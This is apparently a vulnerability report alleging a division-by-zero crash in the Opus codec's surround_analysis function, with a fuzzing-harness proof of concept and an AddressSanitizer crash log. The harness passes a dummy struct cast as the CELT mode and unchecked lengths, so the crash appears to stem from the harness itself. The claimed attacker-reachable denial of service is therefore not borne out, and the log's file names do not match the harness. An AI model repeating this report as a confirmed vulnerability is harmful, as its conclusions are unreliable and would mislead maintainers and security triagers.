# Vulnerability Report: Floating Point Exception (Division by Zero) in Opus `surround_analysis`

## 1. Vulnerability Description

A **Floating Point Exception (FPE)** vulnerability was identified in the **Opus Audio Codec** within the `surround_analysis` function of the multistream encoder. The vulnerability occurs due to a lack of validation for the `freq_size` variable before it is used as a divisor. Under specific input conditions—where the combination of `frame_size`, `rate`, and `celt_mode` parameters fails to satisfy internal logic—the divisor becomes zero, leading to an immediate process crash and potential Denial of Service (DoS).

## 2. Technical Analysis

### Root Cause

The vulnerability resides in `src/opus_multistream_encoder.c`. The function `surround_analysis` calculates a frame division factor using the following logic:

```c
/* Calculation of frame_size and freq_size */
upsample = resampling_factor(rate);
frame_size = len * upsample;

for (LM=0; LM < celt_mode->maxLM; LM++)
    if (celt_mode->shortMdctSize << LM == frame_size)
        break;

freq_size = celt_mode->shortMdctSize << LM;

/* VULNERABLE CODE: Division occurs without checking if freq_size is 0 */
int nb_frames = frame_size / freq_size;
celt_assert(nb_frames * freq_size == frame_size);

```

If the loop terminates without finding a match (i.e., `LM` reaches `celt_mode->maxLM`) and the resulting `freq_size` is zero, or if the input `len` is zero (resulting in `frame_size = 0`), the division `frame_size / freq_size` triggers a hardware-level floating point exception.

### Crash Trace

The crash is consistently reproducible and results in the following state:

* **Type**: AddressSanitizer: FPE (Floating Point Exception)
* **Location**: `/src/opus/src/opus_multistream_encoder.c` within `surround_analysis`
* **Operation**: Integer division by zero.

## 3. Impact

* **Vulnerability Type**: CWE-369 (Divide By Zero)
* **Attack Vector**: An attacker can trigger this vulnerability by providing crafted audio parameters (specifically unconventional combinations of sample rates and frame lengths) to the encoder.
* **Impact**:
* **Denial of Service (DoS)**: Applications utilizing the Opus library for multi-channel/multistream encoding will crash when processing malformed or unexpected data.

## 4. Proof of Concept (PoC)
```c
#include <stdio.h> 
#include <stdlib.h> 
#include <stdint.h> 
#include <string.h>

typedef struct CELTMode CELTMode;
typedef int celt_glog;
typedef int opus_val32;
typedef void (*opus_copy_channel_in_func)(const void *, int, int, int, void *);

void dummy_copy_channel_in(const void *in, int in_stride, int start, int end, void *out) {
}

typedef struct {
    int dummy;
} MockCELTMode;
MockCELTMode mock_celt_mode;
const CELTMode *celt_mode = (const CELTMode *)&mock_celt_mode;

opus_copy_channel_in_func copy_channel_in = dummy_copy_channel_in;

extern void surround_analysis(const CELTMode *celt_mode, const void *pcm, celt_glog *bandLogE,
                              opus_val32 *mem, opus_val32 *preemph_mem, int len, int overlap,
                              int channels, int rate, opus_copy_channel_in_func copy_channel_in, int arch);

#define MAX_CHANNELS 8
#define MAX_LEN 960
#define MAX_OVERLAP 120
#define DEFAULT_RATE 48000

int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    if (Size < 16) return 0;

    int len = *(int*)(Data);
    int overlap = *(int*)(Data + 4);
    int channels = *(int*)(Data + 8);
    int arch = *(int*)(Data + 12);

    len = len % MAX_LEN;
    overlap = overlap % MAX_OVERLAP;
    channels = channels % MAX_CHANNELS;
    if (channels < 1) channels = 1;

    const void *pcm = Data + 16;
    size_t pcm_size = Size - 16;

    celt_glog *bandLogE = (celt_glog*)malloc(channels * sizeof(celt_glog));
    opus_val32 *mem = (opus_val32*)malloc(channels * len * sizeof(opus_val32));
    opus_val32 *preemph_mem = (opus_val32*)malloc(channels * overlap * sizeof(opus_val32));

    int rate = DEFAULT_RATE;

    for (int ch = 0; ch < channels; ch++) {
        surround_analysis(celt_mode, pcm, &bandLogE[ch], &mem[ch * len], &preemph_mem[ch * overlap],
                          len, overlap, 1, rate, copy_channel_in, arch);
    }

    free(bandLogE);
    free(mem);
    free(preemph_mem);

    return 0;
}

```

## 5. Crash Output
```
INFO:__main__:Running: docker run --privileged --shm-size=2g --platform linux/amd64 --rm -e FUZZING_ENGINE=libfuzzer -e SANITIZER=address -e RUN_FUZZER_MODE=interactive -e HELPER=True -v /data/huangzikang/driver_test_data/opus/corpus/surround_analysis-output-1-regen1/opus_repacketizer_fuzzer_fixed:/tmp/opus_repacketizer_fuzzer_fixed_corpus -v /data/huangzikang/uploadfile/oss-fuzz/build/out/surround_analysis-output-1-regen1:/out -t gcr.io/oss-fuzz-base/base-runner run_fuzzer opus_repacketizer_fuzzer_fixed -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0.
vm.mmap_rnd_bits = 28
rm: cannot remove '/tmp/opus_repacketizer_fuzzer_fixed_corpus': Device or resource busy
Using seed corpus: opus_repacketizer_fuzzer_fixed_seed_corpus.zip
/out/opus_repacketizer_fuzzer_fixed -rss_limit_mb=2560 -timeout=25 -runs=100000 -max_total_time=300 -detect_leaks=0 -print_final_stats=1 -len_control=0 /tmp/opus_repacketizer_fuzzer_fixed_corpus < /dev/null
INFO: Running with entropic power schedule (0xFF, 100).
INFO: Seed: 2173743917
INFO: Loaded 1 modules   (11032 inline 8-bit counters): 11032 [0x5628435f8038, 0x5628435fab50), 
INFO: Loaded 1 PC tables (11032 PCs): 11032 [0x5628435fab50,0x562843625cd0), 
INFO:       24 files found in /tmp/opus_repacketizer_fuzzer_fixed_corpus
INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytes
INFO: seed corpus: files: 24 min: 56702b max: 6145920b total: 65091562b rss: 32Mb
==12==WARNING: AddressSanitizer failed to allocate 0xfffffffffffffe40 bytes
AddressSanitizer:DEADLYSIGNAL
=================================================================
==12==ERROR: AddressSanitizer: FPE on unknown address 0x562843484cb1 (pc 0x562843484cb1 bp 0x7fff32df4150 sp 0x7fff32df2c80 T0)
SCARINESS: 10 (signal)
    #0 0x562843484cb1 in surround_analysis /src/opus/src/opus_multistream_encoder.c
    #1 0x562843484668 in LLVMFuzzerTestOneInput /src/opus/tests/opus_repacketizer_fuzzer.c:63:9
    #2 0x56284333b350 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:614:13
    #3 0x56284333ab75 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool, bool*) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:516:7
    #4 0x56284333cb02 in fuzzer::Fuzzer::ReadAndExecuteSeedCorpora(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:829:7
    #5 0x56284333cdf2 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector<fuzzer::SizedFile, std::__Fuzzer::allocator<fuzzer::SizedFile>>&) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:867:3
    #6 0x56284332bf2b in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:914:6
    #7 0x562843357302 in main /src/llvm-project/compiler-rt/lib/fuzzer/FuzzerMain.cpp:20:10
    #8 0x7f1d10cca082 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x24082) (BuildId: 0323ab4806bee6f846d9ad4bccfc29afdca49a58)
    #9 0x56284331e7ad in _start (/out/opus_repacketizer_fuzzer_fixed+0x8a7ad)

DEDUP_TOKEN: surround_analysis--LLVMFuzzerTestOneInput--fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)
AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: FPE /src/opus/src/opus_multistream_encoder.c in surround_analysis
==12==ABORTING
MS: 0 ; base unit: 0000000000000000000000000000000000000000
artifact_prefix='./'; Test unit written to ./crash-338c3f1b4b97226bc60bc41038becbc6de06b28f
stat::number_of_executed_units: 2
stat::average_exec_per_sec:     0
stat::new_units_added:          0
stat::slowest_unit_time_sec:    0
stat::peak_rss_mb:              33

```



